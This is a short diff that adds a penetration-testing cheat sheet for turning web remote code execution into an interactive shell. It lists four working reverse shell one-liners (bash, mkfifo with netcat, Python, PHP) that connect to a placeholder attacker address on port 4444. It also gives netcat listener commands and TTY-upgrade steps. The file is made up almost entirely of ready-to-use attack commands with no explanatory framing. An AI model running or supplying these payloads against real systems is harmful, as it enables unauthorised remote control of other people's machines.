@@ -1,0 +1,16 @@
+WEB → SHELL (from web RCE)
+# Reverse shell payloads
+bash -i >& /dev/tcp/YOURIP/4444 0>&1
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc YOURIP 4444 >/tmp/f
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOURIP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+php -r '$sock=fsockopen("YOURIP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# Catch
+nc -lvnp 4444
+rlwrap nc -lvnp 4444
+
+# Upgrade shell immediately
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+# Ctrl+Z
+stty raw -echo; fg
